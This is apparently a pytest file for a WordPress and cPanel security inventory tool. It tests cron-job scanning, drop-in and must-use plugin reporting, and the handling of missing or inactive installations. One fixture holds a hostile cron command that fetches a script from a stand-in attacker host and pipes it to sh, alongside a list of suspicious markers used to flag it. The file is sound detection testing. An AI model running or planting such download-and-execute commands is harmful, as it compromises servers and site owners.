from __future__ import annotations

from pathlib import Path
from uuid import UUID, uuid4

import pytest

from sentinel.application.wordpress.inventory.queries import GetWordPressInventoryQuery
from sentinel.application.wordpress.inventory.use_cases import RunWordPressInventoryUseCase
from sentinel.domain.discovery.entities import CpanelAccount, WordPressInstallation
from sentinel.domain.discovery.value_objects import LinuxUsername
from sentinel.domain.events.entities import SecurityEvent
from sentinel.domain.integrity.entities import FileBaseline
from sentinel.domain.inventory.entities import InstalledPlugin, InstalledTheme
from sentinel.domain.shared.entity import utcnow
from sentinel.domain.shared.exceptions import EntityNotFoundError
from sentinel.domain.shared.value_objects import (
    AbsoluteFilePath,
    DomainName,
    RelativeFilePath,
    Sha256Hash,
)
from sentinel.domain.wordpress.inventory.entities import WordPressCronJob
from sentinel.infrastructure.wordpress.cron_scanner import CrontabEntry

_HASH = "a" * 64


class FakeWordPressInstallationRepository:
    def __init__(self, installations: list[WordPressInstallation] | None = None) -> None:
        self.by_id: dict[UUID, WordPressInstallation] = {i.id: i for i in installations or []}

    async def add(self, entity: WordPressInstallation) -> None:
        self.by_id[entity.id] = entity

    async def save(self, entity: WordPressInstallation) -> None:
        self.by_id[entity.id] = entity

    async def get(self, entity_id: UUID) -> WordPressInstallation | None:
        return self.by_id.get(entity_id)

    async def list(self, *, limit: int = 50, offset: int = 0) -> list[WordPressInstallation]:
        return list(self.by_id.values())[offset : offset + limit]

    async def get_by_path(self, absolute_path: str) -> WordPressInstallation | None:
        return next((i for i in self.by_id.values() if str(i.absolute_path) == absolute_path), None)

    async def list_by_account(self, cpanel_account_id: UUID) -> list[WordPressInstallation]:
        return [i for i in self.by_id.values() if i.cpanel_account_id == cpanel_account_id]


class FakeCpanelAccountRepository:
    def __init__(self, accounts: list[CpanelAccount]) -> None:
        self.by_id: dict[UUID, CpanelAccount] = {a.id: a for a in accounts}

    async def add(self, entity: CpanelAccount) -> None:
        self.by_id[entity.id] = entity

    async def save(self, entity: CpanelAccount) -> None:
        self.by_id[entity.id] = entity

    async def get(self, entity_id: UUID) -> CpanelAccount | None:
        return self.by_id.get(entity_id)

    async def list(self, *, limit: int = 50, offset: int = 0) -> list[CpanelAccount]:
        return list(self.by_id.values())[offset : offset + limit]

    async def get_by_username(self, username: LinuxUsername) -> CpanelAccount | None:
        return next((a for a in self.by_id.values() if a.username == username), None)

    async def list_by_server(self, server_id: UUID) -> list[CpanelAccount]:
        return [a for a in self.by_id.values() if a.server_id == server_id]


class FakeInstalledPluginRepository:
    def __init__(self, plugins: list[InstalledPlugin] | None = None) -> None:
        self.by_id: dict[UUID, InstalledPlugin] = {p.id: p for p in plugins or []}

    async def add(self, entity: InstalledPlugin) -> None:
        self.by_id[entity.id] = entity

    async def save(self, entity: InstalledPlugin) -> None:
        self.by_id[entity.id] = entity

    async def get(self, entity_id: UUID) -> InstalledPlugin | None:
        return self.by_id.get(entity_id)

    async def list(self, *, limit: int = 50, offset: int = 0) -> list[InstalledPlugin]:
        return list(self.by_id.values())[offset : offset + limit]

    async def get_by_installation_and_slug(
        self, installation_id: UUID, slug: str
    ) -> InstalledPlugin | None:
        return next(
            (
                p
                for p in self.by_id.values()
                if p.installation_id == installation_id and p.slug == slug
            ),
            None,
        )

    async def list_by_installation(self, installation_id: UUID) -> list[InstalledPlugin]:
        return [p for p in self.by_id.values() if p.installation_id == installation_id]


class FakeInstalledThemeRepository:
    def __init__(self, themes: list[InstalledTheme] | None = None) -> None:
        self.by_id: dict[UUID, InstalledTheme] = {t.id: t for t in themes or []}

    async def add(self, entity: InstalledTheme) -> None:
        self.by_id[entity.id] = entity

    async def save(self, entity: InstalledTheme) -> None:
        self.by_id[entity.id] = entity

    async def get(self, entity_id: UUID) -> InstalledTheme | None:
        return self.by_id.get(entity_id)

    async def list(self, *, limit: int = 50, offset: int = 0) -> list[InstalledTheme]:
        return list(self.by_id.values())[offset : offset + limit]

    async def get_by_installation_and_slug(
        self, installation_id: UUID, slug: str
    ) -> InstalledTheme | None:
        return next(
            (
                t
                for t in self.by_id.values()
                if t.installation_id == installation_id and t.slug == slug
            ),
            None,
        )

    async def list_by_installation(self, installation_id: UUID) -> list[InstalledTheme]:
        return [t for t in self.by_id.values() if t.installation_id == installation_id]


class FakeWordPressCronJobRepository:
    def __init__(self, jobs: list[WordPressCronJob] | None = None) -> None:
        self.by_id: dict[UUID, WordPressCronJob] = {j.id: j for j in jobs or []}

    async def add(self, entity: WordPressCronJob) -> None:
        self.by_id[entity.id] = entity

    async def save(self, entity: WordPressCronJob) -> None:
        self.by_id[entity.id] = entity

    async def get(self, entity_id: UUID) -> WordPressCronJob | None:
        return self.by_id.get(entity_id)

    async def list(self, *, limit: int = 50, offset: int = 0) -> list[WordPressCronJob]:
        return list(self.by_id.values())[offset : offset + limit]

    async def list_by_installation(self, installation_id: UUID) -> list[WordPressCronJob]:
        return [j for j in self.by_id.values() if j.installation_id == installation_id]

    async def get_by_installation_and_command(
        self, installation_id: UUID, command: str
    ) -> WordPressCronJob | None:
        return next(
            (
                j
                for j in self.by_id.values()
                if j.installation_id == installation_id and j.command == command
            ),
            None,
        )


class FakeSecurityEventRepository:
    def __init__(self) -> None:
        self.by_id: dict[UUID, SecurityEvent] = {}

    async def add(self, entity: SecurityEvent) -> None:
        self.by_id[entity.id] = entity

    async def save(self, entity: SecurityEvent) -> None:
        self.by_id[entity.id] = entity

    async def get(self, entity_id: UUID) -> SecurityEvent | None:
        return self.by_id.get(entity_id)

    async def list(self, *, limit: int = 50, offset: int = 0) -> list[SecurityEvent]:
        return list(self.by_id.values())[offset : offset + limit]

    async def list_unprocessed(self, *, limit: int = 200) -> list[SecurityEvent]:
        return [e for e in self.by_id.values() if e.processed_at is None][:limit]

    async def count_total(self) -> int:
        return len(self.by_id)

    async def count_unprocessed(self) -> int:
        return len([e for e in self.by_id.values() if e.processed_at is None])

    async def list_by_account(self, account_id: UUID, *, limit: int = 200) -> list[SecurityEvent]:
        return [e for e in self.by_id.values() if e.account_id == account_id][:limit]


class FakeFileBaselineRepository:
    def __init__(self, baselines: list[FileBaseline] | None = None) -> None:
        self.by_id: dict[UUID, FileBaseline] = {b.id: b for b in baselines or []}

    async def add(self, entity: FileBaseline) -> None:
        self.by_id[entity.id] = entity

    async def save(self, entity: FileBaseline) -> None:
        self.by_id[entity.id] = entity

    async def get(self, entity_id: UUID) -> FileBaseline | None:
        return self.by_id.get(entity_id)

    async def list(self, *, limit: int = 50, offset: int = 0) -> list[FileBaseline]:
        return list(self.by_id.values())[offset : offset + limit]

    async def get_by_account_and_path(
        self, account_id: UUID, relative_path: RelativeFilePath
    ) -> FileBaseline | None:
        return next(
            (
                b
                for b in self.by_id.values()
                if b.account_id == account_id and b.relative_path == relative_path
            ),
            None,
        )

    async def list_by_account(self, account_id: UUID) -> list[FileBaseline]:
        return [b for b in self.by_id.values() if b.account_id == account_id]


class FakeCrontabScanner:
    def __init__(self, entries: list[CrontabEntry]) -> None:
        self._entries = entries

    async def scan(self, account: CpanelAccount) -> list[CrontabEntry]:
        return list(self._entries)


def _account() -> CpanelAccount:
    return CpanelAccount(
        server_id=uuid4(),
        username=LinuxUsername(value="examplebob1"),
        primary_domain=DomainName(value="example.com"),
        home_directory=AbsoluteFilePath(value="/home/examplebob1"),
        is_suspended=False,
        is_active=True,
        last_seen_at=utcnow(),
    )


def _installation(account_id: UUID) -> WordPressInstallation:
    return WordPressInstallation(
        cpanel_account_id=account_id,
        absolute_path=AbsoluteFilePath(value="/home/examplebob1/public_html"),
        domain=DomainName(value="example.com"),
        wp_version="6.5",
        is_multisite=False,
        last_seen_at=utcnow(),
    )


async def test_inventory_use_case_records_cron_jobs_and_emits_snapshot() -> None:
    account = _account()
    installation = _installation(account.id)
    installations = FakeWordPressInstallationRepository([installation])
    accounts = FakeCpanelAccountRepository([account])
    plugins = FakeInstalledPluginRepository()
    themes = FakeInstalledThemeRepository()
    cron_jobs = FakeWordPressCronJobRepository()
    events = FakeSecurityEventRepository()
    scanner = FakeCrontabScanner(
        [
            CrontabEntry(schedule_raw="*/5 * * * *", command="wget http://evil.example -O- | sh"),
            CrontabEntry(schedule_raw="0 0 * * *", command="/usr/bin/php /home/bob/cron.php"),
        ]
    )

    use_case = RunWordPressInventoryUseCase(
        installation_repository=installations,
        account_repository=accounts,
        plugin_repository=plugins,
        theme_repository=themes,
        cron_job_repository=cron_jobs,
        event_repository=events,
        cron_scanner=scanner,
        suspicious_cron_markers=["| sh", "| bash", "curl ", "wget "],
    )

    result = await use_case.execute()

    assert result.installations_scanned == 1
    assert result.cron_jobs_found == 2
    assert result.suspicious_cron_jobs == 1
    assert len(cron_jobs.by_id) == 2
    suspicious = [j for j in cron_jobs.by_id.values() if j.is_suspicious]
    assert len(suspicious) == 1
    assert suspicious[0].flag_reason is not None
    assert "suspicious pattern" in suspicious[0].flag_reason

    (event,) = events.by_id.values()
    assert event.event_type == "wordpress_inventory_snapshot"
    assert event.source_context == "wordpress"
    assert event.account_id == account.id
    assert event.payload["cron_job_count"] == 2


async def test_inventory_use_case_marks_disappeared_cron_jobs_absent() -> None:
    account = _account()
    installation = _installation(account.id)
    stale_job = WordPressCronJob(
        installation_id=installation.id,
        command="/old/command.sh",
        schedule_raw="* * * * *",
        last_seen_at=utcnow(),
    )
    installations = FakeWordPressInstallationRepository([installation])
    accounts = FakeCpanelAccountRepository([account])
    cron_jobs = FakeWordPressCronJobRepository([stale_job])
    events = FakeSecurityEventRepository()

    use_case = RunWordPressInventoryUseCase(
        installation_repository=installations,
        account_repository=accounts,
        plugin_repository=FakeInstalledPluginRepository(),
        theme_repository=FakeInstalledThemeRepository(),
        cron_job_repository=cron_jobs,
        event_repository=events,
        cron_scanner=FakeCrontabScanner([]),
        suspicious_cron_markers=[],
    )

    await use_case.execute()

    assert cron_jobs.by_id[stale_job.id].is_present is False


async def test_inventory_use_case_skips_installations_with_no_matching_account() -> None:
    orphan_installation = _installation(uuid4())
    installations = FakeWordPressInstallationRepository([orphan_installation])

    use_case = RunWordPressInventoryUseCase(
        installation_repository=installations,
        account_repository=FakeCpanelAccountRepository([]),
        plugin_repository=FakeInstalledPluginRepository(),
        theme_repository=FakeInstalledThemeRepository(),
        cron_job_repository=FakeWordPressCronJobRepository(),
        event_repository=FakeSecurityEventRepository(),
        cron_scanner=FakeCrontabScanner([]),
        suspicious_cron_markers=[],
    )

    result = await use_case.execute()

    assert result.installations_scanned == 0


async def test_inventory_use_case_updates_existing_cron_job_when_reseen() -> None:
    account = _account()
    installation = _installation(account.id)
    existing_job = WordPressCronJob(
        installation_id=installation.id,
        command="/usr/bin/php /home/bob/cron.php",
        schedule_raw="0 0 * * *",
        last_seen_at=utcnow(),
    )
    installations = FakeWordPressInstallationRepository([installation])
    accounts = FakeCpanelAccountRepository([account])
    cron_jobs = FakeWordPressCronJobRepository([existing_job])
    scanner = FakeCrontabScanner(
        [CrontabEntry(schedule_raw="*/10 * * * *", command=existing_job.command)]
    )

    use_case = RunWordPressInventoryUseCase(
        installation_repository=installations,
        account_repository=accounts,
        plugin_repository=FakeInstalledPluginRepository(),
        theme_repository=FakeInstalledThemeRepository(),
        cron_job_repository=cron_jobs,
        event_repository=FakeSecurityEventRepository(),
        cron_scanner=scanner,
        suspicious_cron_markers=[],
    )

    await use_case.execute()

    assert cron_jobs.by_id[existing_job.id].schedule_raw == "*/10 * * * *"
    assert cron_jobs.by_id[existing_job.id].is_present is True


async def test_inventory_use_case_skips_inactive_installations() -> None:
    account = _account()
    installation = _installation(account.id)
    installation.is_active = False
    installations = FakeWordPressInstallationRepository([installation])
    accounts = FakeCpanelAccountRepository([account])

    use_case = RunWordPressInventoryUseCase(
        installation_repository=installations,
        account_repository=accounts,
        plugin_repository=FakeInstalledPluginRepository(),
        theme_repository=FakeInstalledThemeRepository(),
        cron_job_repository=FakeWordPressCronJobRepository(),
        event_repository=FakeSecurityEventRepository(),
        cron_scanner=FakeCrontabScanner([]),
        suspicious_cron_markers=[],
    )

    result = await use_case.execute()

    assert result.installations_scanned == 0


async def test_get_wordpress_inventory_query_reports_dropin_and_mu_plugin_status(
    tmp_path: Path,
) -> None:
    account = _account()
    home = tmp_path / "public_html"
    (home / "wp-content" / "mu-plugins").mkdir(parents=True)
    (home / "wp-content" / "mu-plugins" / "loader.php").write_text("<?php // noop")

    installation = WordPressInstallation(
        cpanel_account_id=account.id,
        absolute_path=AbsoluteFilePath(value=str(home)),
        domain=DomainName(value="example.com"),
        wp_version="6.5",
        php_version="8.1",
        is_multisite=False,
        last_seen_at=utcnow(),
    )
    installations = FakeWordPressInstallationRepository([installation])
    baseline = FileBaseline(
        account_id=account.id,
        relative_path=RelativeFilePath(value="wp-content/db.php"),
        sha256=Sha256Hash(value=_HASH),
        size_bytes=10,
        mode="644",
        last_verified_at=utcnow(),
    )
    baselines = FakeFileBaselineRepository([baseline])

    query = GetWordPressInventoryQuery(
        installation_repository=installations,
        baseline_repository=baselines,
        dropin_relative_paths=[
            "wp-content/db.php",
            "wp-content/object-cache.php",
            "wp-content/advanced-cache.php",
        ],
    )

    report = await query.execute(installation.id)

    assert report.wp_version == "6.5"
    assert report.php_version == "8.1"
    dropin_by_path = {d.relative_path: d for d in report.drop_ins}
    assert dropin_by_path["wp-content/db.php"].is_present is True
    assert dropin_by_path["wp-content/db.php"].sha256 == _HASH
    assert dropin_by_path["wp-content/object-cache.php"].is_present is False
    assert report.must_use_plugins == ["loader.php"]


async def test_get_wordpress_inventory_query_handles_missing_mu_plugins_directory(
    tmp_path: Path,
) -> None:
    account = _account()
    home = tmp_path / "public_html"
    home.mkdir()  # no wp-content/mu-plugins directory at all

    installation = WordPressInstallation(
        cpanel_account_id=account.id,
        absolute_path=AbsoluteFilePath(value=str(home)),
        domain=DomainName(value="example.com"),
        wp_version="6.5",
        is_multisite=False,
        last_seen_at=utcnow(),
    )
    query = GetWordPressInventoryQuery(
        installation_repository=FakeWordPressInstallationRepository([installation]),
        baseline_repository=FakeFileBaselineRepository(),
        dropin_relative_paths=[],
    )

    report = await query.execute(installation.id)

    assert report.must_use_plugins == []


async def test_get_wordpress_inventory_query_raises_for_unknown_installation() -> None:
    query = GetWordPressInventoryQuery(
        installation_repository=FakeWordPressInstallationRepository(),
        baseline_repository=FakeFileBaselineRepository(),
        dropin_relative_paths=[],
    )

    with pytest.raises(EntityNotFoundError):
        await query.execute(uuid4())
